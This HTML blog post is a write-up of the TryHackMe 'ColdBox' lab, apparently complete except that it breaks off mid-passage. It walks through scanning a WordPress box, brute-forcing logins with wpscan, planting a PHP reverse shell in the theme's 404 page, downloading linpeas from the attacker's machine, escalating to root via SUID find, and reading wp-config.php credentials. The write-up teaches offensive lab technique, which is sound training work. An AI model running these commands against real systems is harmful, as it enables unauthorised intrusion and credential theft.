@@ -1,0 +1,860 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Some big-brain moves here and there, WordPress CMS and multiple paths to root. Find em all!'><title>TryHackMe: ColdBox Writeup (All Paths)</title>
+
+<link rel='canonical' href='/p/tryhackme-coldbox-writeup-all-paths/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='TryHackMe: ColdBox Writeup (All Paths)'>
+<meta property='og:description' content='Some big-brain moves here and there, WordPress CMS and multiple paths to root. Find em all!'>
+<meta property='og:url' content='/p/tryhackme-coldbox-writeup-all-paths/'>
+<meta property='og:site_name' content='Tanishq Chaudhary'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='web-work' /><meta property='article:tag' content='cms' /><meta property='article:tag' content='suid' /><meta property='article:tag' content='multiple-paths' /><meta property='article:published_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='og:image' content='https://i.imgur.com/k2cJkVq.png' />
+<meta name="twitter:title" content="TryHackMe: ColdBox Writeup (All Paths)">
+<meta name="twitter:description" content="Some big-brain moves here and there, WordPress CMS and multiple paths to root. Find em all!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://i.imgur.com/k2cJkVq.png' />
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-3DJP1JG0KN', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu8feb5f378a01bc01544f018dbe1cdca8_26024_300x0_resize_q75_box.jpeg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="/">Tanishq Chaudhary</a></h1>
+        <h2 class="site-description">Undergrad Researcher at LTRC, IIIT-H. I like Pen-Testing &amp; NLP.</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/categories/thm'>
+                
+                    <?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="552.000000pt" height="564.000000pt" viewBox="0 0 552.000000 564.000000"
+ preserveAspectRatio="xMidYMid meet">
+
+<g transform="translate(0.000000,564.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M2280 5630 c-345 -48 -646 -195 -885 -435 -126 -126 -204 -230 -280
+-377 -52 -99 -134 -321 -135 -363 -1 -35 -14 -44 -91 -59 -231 -44 -420 -147
+-583 -316 -131 -136 -210 -272 -260 -444 -110 -380 4 -796 293 -1069 131 -123
+296 -215 478 -265 l98 -27 905 -3 c849 -2 907 -1 940 15 104 53 108 192 7 267
+-28 21 -35 21 -935 26 l-907 5 -88 31 c-205 74 -358 209 -451 399 -46 93 -66
+170 -73 285 -22 360 213 680 574 782 110 31 286 31 396 0 81 -23 162 -60 243
+-112 80 -50 172 -34 221 39 29 43 31 113 3 158 -49 81 -222 167 -457 229 -9 2
+-8 16 3 56 121 413 449 731 871 845 91 25 113 27 298 27 185 0 207 -2 298 -27
+450 -121 794 -479 892 -927 13 -58 13 -66 -2 -75 -8 -5 -44 -28 -79 -50 -35
+-23 -72 -51 -80 -64 -39 -55 -34 -142 9 -189 62 -67 140 -68 240 -3 215 140
+505 156 742 42 210 -102 354 -275 418 -504 28 -98 57 -139 114 -158 71 -23
+153 15 184 87 24 54 21 85 -23 219 -95 292 -323 537 -609 656 -144 59 -208 70
+-416 76 l-192 5 -12 52 c-6 28 -27 96 -46 150 -177 510 -603 883 -1138 996
+-114 24 -378 35 -485 20z"/>
+<path d="M3605 3136 c-45 -19 -92 -79 -110 -138 -20 -68 -20 -257 0 -325 32
+-107 101 -163 200 -163 140 1 204 87 213 285 8 180 -34 296 -121 336 -49 22
+-138 24 -182 5z m109 -96 c49 -18 61 -61 61 -210 0 -118 -3 -139 -21 -170 -17
+-30 -25 -35 -58 -35 -31 0 -43 6 -60 28 -19 26 -21 42 -21 170 0 172 10 204
+72 226 1 1 13 -3 27 -9z"/>
+<path d="M5120 3128 c-35 -18 -51 -35 -72 -78 -66 -133 -56 -381 19 -471 55
+-66 166 -88 249 -50 75 34 112 113 121 258 10 158 -28 281 -104 333 -53 36
+-151 40 -213 8z m147 -100 c26 -21 38 -85 38 -203 -1 -138 -16 -190 -59 -201
+-36 -9 -69 1 -84 26 -33 54 -33 306 -1 359 24 38 72 46 106 19z"/>
+<path d="M3104 3069 c-49 -39 -93 -74 -98 -79 -9 -9 40 -80 56 -80 6 0 32 18
+58 40 26 22 49 40 51 40 2 0 2 -106 0 -235 l-3 -235 71 0 71 0 0 310 0 310
+-59 0 c-58 0 -60 -1 -147 -71z"/>
+<path d="M4639 3074 c-123 -96 -117 -87 -85 -128 15 -20 31 -36 36 -36 4 0 32
+20 62 44 l53 43 -3 -238 -3 -239 66 0 65 0 0 310 0 310 -53 0 c-51 0 -58 -3
+-138 -66z"/>
+<path d="M4625 2196 c-90 -25 -135 -101 -150 -256 -9 -83 9 -206 37 -266 41
+-88 134 -129 239 -104 64 16 111 60 135 132 26 72 26 291 1 357 -46 119 -142
+169 -262 137z m97 -107 c28 -15 47 -66 54 -147 14 -153 -18 -263 -80 -270 -62
+-7 -88 53 -88 206 0 122 13 185 45 207 25 18 41 19 69 4z"/>
+<path d="M3101 2120 c-55 -44 -101 -83 -101 -86 0 -8 54 -74 62 -74 3 0 30 20
+60 44 l53 43 -4 -238 -3 -239 71 0 71 0 -2 313 -3 312 -51 3 c-51 3 -53 2
+-153 -78z"/>
+<path d="M3601 2120 c-56 -44 -101 -83 -101 -88 0 -4 13 -23 29 -42 l29 -34
+59 45 58 46 -3 -238 -3 -239 65 0 66 0 0 315 0 315 -49 0 c-47 0 -55 -4 -150
+-80z"/>
+<path d="M4125 2142 c-39 -31 -84 -68 -102 -82 l-32 -25 34 -40 33 -39 59 46
+58 45 -3 -238 -3 -239 66 0 65 0 0 315 0 315 -52 -1 c-49 0 -58 -5 -123 -57z"/>
+<path d="M4974 1356 c-71 -32 -98 -104 -92 -246 3 -73 8 -104 24 -130 58 -101
+196 -108 255 -14 21 34 24 53 27 154 3 104 1 119 -20 159 -13 25 -35 53 -49
+64 -34 25 -105 31 -145 13z m103 -93 c14 -21 18 -48 18 -128 0 -80 -4 -107
+-18 -128 -22 -34 -61 -36 -81 -4 -36 54 -27 254 12 277 29 16 51 11 69 -17z"/>
+<path d="M3073 1353 c-40 -8 -81 -59 -94 -117 -17 -77 -8 -214 17 -257 32 -55
+80 -82 137 -76 102 9 141 71 141 222 0 113 -21 180 -68 210 -27 18 -94 27
+-133 18z m92 -103 c10 -20 15 -58 15 -119 0 -129 -17 -162 -75 -147 -33 8 -48
+68 -43 173 3 62 9 88 23 103 27 30 62 26 80 -10z"/>
+<path d="M3769 1345 c-23 -10 -44 -31 -60 -58 -22 -38 -24 -54 -24 -157 0
+-130 13 -166 76 -208 27 -19 43 -23 82 -19 102 9 141 71 142 222 0 155 -40
+223 -138 231 -24 2 -57 -3 -78 -11z m108 -95 c8 -15 13 -64 13 -120 0 -56 -5
+-105 -13 -120 -17 -33 -57 -38 -83 -9 -16 18 -19 36 -19 129 0 93 3 111 19
+129 26 29 66 24 83 -9z"/>
+<path d="M5328 1304 c-38 -30 -68 -58 -68 -62 1 -4 9 -17 20 -30 21 -26 39
+-21 74 17 11 12 22 21 25 21 4 0 5 -76 3 -170 l-4 -170 51 0 51 0 0 225 0 225
+-42 0 c-37 0 -52 -8 -110 -56z"/>
+<path d="M3407 1294 c-67 -55 -70 -61 -39 -96 14 -16 17 -16 53 13 l39 31 0
+-166 0 -166 50 0 50 0 0 220 0 220 -42 0 c-37 0 -52 -8 -111 -56z"/>
+<path d="M4117 1294 c-67 -55 -70 -61 -39 -96 14 -16 17 -16 52 12 21 17 39
+30 41 30 2 0 3 -74 1 -165 l-3 -165 50 0 51 0 0 220 0 220 -42 0 c-37 0 -52
+-8 -111 -56z"/>
+<path d="M4561 825 c-49 -42 -64 -98 -59 -217 6 -156 45 -208 155 -208 100 0
+148 75 147 231 -1 92 -23 158 -65 194 -25 20 -41 25 -89 25 -48 0 -64 -5 -89
+-25z m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27
+-72 0 -16 18 -19 37 -19 134 0 97 3 116 19 134 11 12 27 21 36 21 9 0 25 -9
+36 -21z"/>
+<path d="M4942 795 c-40 -31 -72 -59 -72 -63 0 -4 9 -18 19 -32 l20 -25 40 33
+41 33 0 -171 0 -171 48 3 47 3 0 220 0 220 -36 3 c-30 3 -46 -5 -107 -53z"/>
+<path d="M5271 825 c-49 -42 -64 -98 -59 -217 6 -156 45 -208 157 -208 48 0
+57 3 91 38 32 32 39 47 50 110 20 119 -5 229 -62 277 -43 36 -133 36 -177 0z
+m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
+0 -16 18 -19 37 -19 134 0 97 3 116 19 134 11 12 27 21 36 21 9 0 25 -9 36
+-21z"/>
+<path d="M3019 715 c-69 -37 -81 -224 -19 -287 52 -51 146 -32 169 34 19 54
+14 178 -9 216 -31 50 -89 65 -141 37z m79 -58 c18 -21 25 -109 13 -154 -14
+-50 -39 -63 -63 -33 -20 25 -25 130 -8 174 10 28 40 35 58 13z"/>
+<path d="M3280 684 c-53 -42 -54 -43 -35 -68 15 -19 15 -19 38 2 13 12 26 22
+30 22 4 0 7 -54 7 -121 l0 -120 33 3 32 3 3 158 3 157 -33 0 c-23 0 -47 -11
+-78 -36z"/>
+<path d="M3913 320 c-35 -14 -55 -55 -61 -125 -5 -73 11 -145 38 -170 10 -9
+37 -19 59 -22 80 -11 121 45 121 164 0 127 -65 190 -157 153z m77 -65 c14 -17
+18 -136 6 -172 -9 -29 -35 -37 -57 -17 -15 14 -19 32 -19 91 0 41 5 83 10 94
+13 23 43 25 60 4z"/>
+<path d="M4167 284 c-52 -40 -52 -41 -33 -67 13 -17 15 -16 45 9 l31 26 0
+-126 0 -126 30 0 30 0 0 160 0 160 -28 0 c-18 0 -47 -14 -75 -36z"/>
+</g>
+</svg>
+
+                
+                <span>TryHackMe Writeups</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/tags/'>
+                
+                    <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 width="500.536px" height="500.536px" viewBox="0 0 500.536 500.536" style="enable-background:new 0 0 500.536 500.536;"
+	 xml:space="preserve">
+<g>
+	<path d="M410.614,323.309L186.108,98.815c-2.444-2.444-5.754-3.818-9.212-3.818H94.702c-5.925-7.524-13.878-13.97-23.241-18.613
+		c-22.529-11.198-47.907-9.351-61.738,4.465c-2.554,2.556-4.661,5.473-6.239,8.674c-5.11,10.272-4.581,22.481,1.472,34.362
+		c5.834,11.464,16.178,21.311,29.143,27.745c5.816,2.887,11.818,4.888,17.765,6.064v62.329c0.006,3.458,1.38,6.78,3.824,9.218
+		l224.494,224.499c5.095,5.096,13.34,5.096,18.436,0L410.62,341.738C415.703,336.655,415.703,328.403,410.614,323.309z
+		 M55.688,98.815c-2.438,2.438-3.818,5.763-3.818,9.212v40.802c-4.648-1.067-9.327-2.713-13.905-4.983
+		c-11.298-5.609-20.28-14.097-25.263-23.909c-4.776-9.369-5.284-18.799-1.434-26.545c1.162-2.355,2.705-4.51,4.604-6.393
+		c11.222-11.222,32.492-12.383,51.725-2.831c5.861,2.905,11.065,6.591,15.448,10.829H64.905
+		C61.445,94.988,58.132,96.365,55.688,98.815z M84.364,127.497c3.487-3.49,7.826-5.627,12.354-6.428
+		c0.399,4.82-0.375,9.425-2.415,13.547c-1.162,2.355-2.71,4.51-4.61,6.398c-3.18,3.183-7.19,5.523-11.724,7.075
+		C76.635,140.85,78.76,133.098,84.364,127.497z M117.139,160.272c-9.049,9.049-23.726,9.049-32.775,0
+		c-1.271-1.271-2.353-2.657-3.257-4.125c5.654-1.969,10.702-4.947,14.738-8.984c2.557-2.554,4.661-5.471,6.242-8.671
+		c2.657-5.353,3.76-11.225,3.378-17.295c4.28,0.883,8.364,2.979,11.68,6.301C126.188,136.546,126.188,151.217,117.139,160.272z
+		 M496.717,315.631L384.725,427.628c-5.095,5.089-13.352,5.089-18.441,0l-5.674-5.675l69.83-69.841
+		c4.899-4.889,7.589-11.391,7.589-18.3c0-6.91-2.684-13.412-7.583-18.294L205.957,91.013c-4.903-4.891-11.399-7.578-18.291-7.578
+		h-49.694v-1.519c0-3.455,1.38-6.773,3.827-9.218c2.444-2.441,5.748-3.818,9.206-3.818h18.146
+		c-4.389-4.232-9.599-7.923-15.447-10.829c-19.24-9.552-40.51-8.39-51.731,2.832c-1.894,1.882-3.431,4.037-4.613,6.393
+		c-0.556,1.138-0.999,2.311-1.374,3.517c-2.474-1.581-5.003-3.083-7.654-4.412c0.381-0.999,0.762-2.004,1.241-2.974
+		c1.596-3.194,3.691-6.111,6.25-8.674c13.819-13.816,39.215-15.658,61.738-4.466c9.357,4.643,17.315,11.089,23.235,18.613h82.198
+		c3.446,0,6.768,1.377,9.215,3.818l224.496,224.497C501.812,302.29,501.812,310.548,496.717,315.631z"/>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+                
+                <span>Tags</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>Dark Mode</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="/" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/tryhackme-coldbox-writeup-all-paths/">
+                
+                    <img src="https://i.imgur.com/k2cJkVq.png" loading="lazy" alt="Featured image of post TryHackMe: ColdBox Writeup (All Paths)" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/thm/" style="background-color: #2a9d8f; color: #fff;">
+                TryHackMe
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/tryhackme-coldbox-writeup-all-paths/">TryHackMe: ColdBox Writeup (All Paths)</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        Some big-brain moves here and there, WordPress CMS and multiple paths to root. Find em all!
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Jun 15, 2021</time>
+    </footer></div>
+</header>
+
+    <section class="article-content">
+    <p><a class="link" href="https://tryhackme.com/room/colddboxeasy"  target="_blank" rel="noopener"
+    >Play</a></p>
+<h2 id="1-scanning--enumeration">1. Scanning &amp; Enumeration</h2>
+<p>We do the below scans in parallel.</p>
+<h3 id="11-port-scanning">1.1. Port Scanning</h3>
+<pre><code>Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: WordPress 4.1.31
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: ColddBox | One more machine
+</code></pre><p>Nothing interesting. Only port 80 open, no ssh.</p>
+<pre><code>Not shown: 65530 closed ports
+PORT      STATE    SERVICE
+80/tcp    open     http
+4512/tcp  open     unknown
+8584/tcp  filtered unknown
+43286/tcp filtered unknown
+59766/tcp filtered unknown
+</code></pre><p>Again, these don&rsquo;t look like they are expected. We may check 4512 later.+</p>
+<h3 id="12-web-enumeration">1.2. Web Enumeration</h3>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 32 -q -u 10.10.141.86         
+/index.php            (Status: 301) [Size: 0] [--&gt; http://10.10.141.86/]
+/wp-content           (Status: 301) [Size: 317] [--&gt; http://10.10.141.86/wp-content/]
+/wp-login.php         (Status: 200) [Size: 2547]                                     
+/license.txt          (Status: 200) [Size: 19930]                                    
+/wp-includes          (Status: 301) [Size: 318] [--&gt; http://10.10.141.86/wp-includes/]
+/readme.html          (Status: 200) [Size: 7173]                                      
+/wp-trackback.php     (Status: 200) [Size: 135]                                       
+/wp-admin             (Status: 301) [Size: 315] [--&gt; http://10.10.141.86/wp-admin/]   
+/hidden               (Status: 301) [Size: 313] [--&gt; http://10.10.141.86/hidden/]     
+/xmlrpc.php           (Status: 200) [Size: 42]                                        
+</code></pre><p>Note the <code>/hidden/</code> directory. Rest everything looks standard.</p>
+<p>I tried exploring the <code>wp-trackback</code>, but it looked like a dead end.</p>
+<h3 id="13-web-exploration">1.3. Web Exploration</h3>
+<p><img src="https://i.imgur.com/u4M5YBh.png" alt="ColddBox homepage"  /></p>
+<p>The author is mentioned as:</p>
+<p><code>Author: the cold in person</code>
+<img src="https://i.imgur.com/8fjTVzI.png" alt="author of the page in coldbox thm page"  /></p>
+<p>This username is incorrect, as shown by the WordPress error message.
+<img src="https://i.imgur.com/5fZKpzg.png" alt="wp login error message of invalid username"  /></p>
+<h3 id="14-hidden-directory">1.4. Hidden Directory</h3>
+<p>We find a hidden directory in the gobsuter scan.
+<img src="https://i.imgur.com/ZnRS0ih.png" alt="urgent webpage in the hidden directory"  /></p>
+<p>We thus get a list of the usernames:</p>
+<ul>
+<li>C0ldd</li>
+<li>Hugo</li>
+<li>Philip
+Trying them out gives the same error message for all of them. This means we can brute-forcing!
+<img src="https://i.imgur.com/VRC872l.png" alt="incorrect password error message means we have the correct username"  /></li>
+</ul>
+<h3 id="15-brute-force">1.5. Brute-Force</h3>
+<p>We use the <code>wpscan</code> tool.</p>
+<p><code>wpscan --url http://10.10.141.86/ -U c0ldd,philip,hugo -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 32</code> -&gt;</p>
+<ul>
+<li>&ndash;url: specifies the url</li>
+<li>-U: specifies the userlist</li>
+<li>-P: specifies the passwordlist</li>
+<li>-t: threads</li>
+<li>&ndash;password-attack: self explanatory</li>
+</ul>
+<p>Wait patiently, this scan took me 12+ minutes. We thus get: <code>[SUCCESS] - c0ldd / {the author yeeted this}</code>
+<img src="https://i.imgur.com/TflUIH8.png" alt="cms dashboard page"  /></p>
+<h2 id="2-foothold">2. Foothold</h2>
+<p>To get a foothold, I usually edit the 404.php page.
+It can be found in: Appearance -&gt; editor -&gt; 404.php</p>
+<p><img src="https://imgur.com/ewcF9UW.png" alt="editing the php 404 page"  /></p>
+<p>I put the phprevshell. This can be taken from <a class="link" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"  target="_blank" rel="noopener"
+    >github here</a></p>
+<ol>
+<li>Start a listener on selected port. Listen using <code>nc -lnvp PORT_NUMBER_HERE</code>.</li>
+<li>Go to: <code>http://10.10.141.86/?p=2</code> (only post=1 exists)</li>
+</ol>
+<pre><code>┌──(kali㉿kali)-[~/Desktop/tools/files]
+└─$ nc -lvnp 443  
+listening on [any] 443 ...
+connect to [10.17.8.184] from (UNKNOWN) [10.10.141.86] 54404
+Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 06:14:23 up 45 min,  0 users,  load average: 0.30, 12.10, 16.15
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+www-data@ColddBox-Easy:/$ 
+</code></pre><p>We are in!</p>
+<h2 id="3-privesc">3. PrivEsc</h2>
+<p>I transferred the <code>linpeas.sh</code> file, which you can take from <a class="link" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh"  target="_blank" rel="noopener"
+    >here</a>.</p>
+<p>Start a python server on your machine, using <code>sudo python3 -m http.server 80</code> and on the target machine, <code>wget YOUR_IP_ADDRESS/linpeas.sh</code>. Make sure that you are in a directory with write permisssions. One <em>really</em> good place is <code>/tmp</code> direcotry. Execute the file using <code>bash linpeas.sh</code></p>
+<p>The following was marked as potential PE vectors.</p>
+<pre><code>[+] Operative system                                                                       
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits            
+Linux version 4.4.0-186-generic (buildd@lcy01-amd64-002) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020
+Distributor ID: Ubuntu
+Description:    Ubuntu 16.04.7 LTS
+Release:        16.04
+Codename:       xenial
+</code></pre><p>Looks like an old kernel version.</p>
+<pre><code>[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version               
+Sudo version 1.8.16   
+</code></pre><p>This exploit only works in certain conditions:</p>
+<ul>
+<li><input disabled="" type="checkbox"> you know sudo password of <em>any</em> user</li>
+<li><input disabled="" type="checkbox"> the permissions look something like: <code>(ALL, !root) /usr/bin/id</code>.</li>
+</ul>
+<pre><code>[+] SUID - Check easy privesc, exploits and write perms                                    
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid              
+-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping6                                
+-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping
+-rwsr-sr-x 1 daemon daemon      51K Jan 14  2016 /usr/bin/at  ---&gt;  RTru64_UNIX_4.0g(CVE-2002-1614)                                                                                   
+-rwsr-xr-x 1 root   root       217K Feb  8  2016 /usr/bin/find
+
+</code></pre><p><code>/usr/bin/find marked</code>. We can also find other files with the set-uid bit. Look at the following.</p>
+<pre><code>www-data@ColddBox-Easy:/tmp$ find / -type f -perm -u=s 2&gt; /dev/null
+find / -type f -perm -u=s 2&gt; /dev/null
+/bin/su
+/bin/ping6
+/bin/ping
+/bin/fusermount
+/bin/umount
+/bin/mount
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/pkexec
+/usr/bin/find
+/usr/bin/sudo
+/usr/bin/newgidmap
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</code></pre><h3 id="31-suid-bit-find-binary">3.1. SUID Bit: Find Binary</h3>
+<p>Using <a class="link" href="https://gtfobins.github.io/gtfobins/find/#suid"  target="_blank" rel="noopener"
+    >GTFOBins - Find SUID</a>.</p>
+<pre><code>www-data@ColddBox-Easy:/tmp$ find . -exec /bin/sh -p \; -quit
+find . -exec /bin/sh -p \; -quit
+# id    
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+</code></pre><p>With this, we can view both the user and root flags in the <code>/home/c0ldd</code> and the <code>/root</code> directory.</p>
+<h3 id="32-exploration--sudo-3-paths">3.2. Exploration + SUDO: 3 Paths</h3>
+<p>Note how we have the user <code>c0ldd</code>. Could we try and getting some credentials? From other machines, I know <code>wp-config.php</code> is a juicy file. Exploring that,</p>
+<pre><code>www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
+cat wp-config.php
+&lt;?php
+/**
+ * The base configurations of the WordPress.
+ *
+ * This file has the following configurations: MySQL settings, Table Prefix,
+ * Secret Keys, and ABSPATH. You can find more information by visiting
+ * {@link http://codex.cms.org/Editing_wp-config.php Editing wp-config.php}
+ * Codex page. You can get the MySQL settings from your web host.
+ *
+ * This file is used by the wp-config.php creation script during the
+ * installation. You don't have to use the web site, you can just copy this file
+ * to &quot;wp-config.php&quot; and fill in the values.
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'colddbox');
+
+/** MySQL database username */
+define('DB_USER', 'c0ldd');
+
+/** MySQL database password */
+define('DB_PASSWORD', '{i ate this, was too tasty}');
+
+/** MySQL hostname */
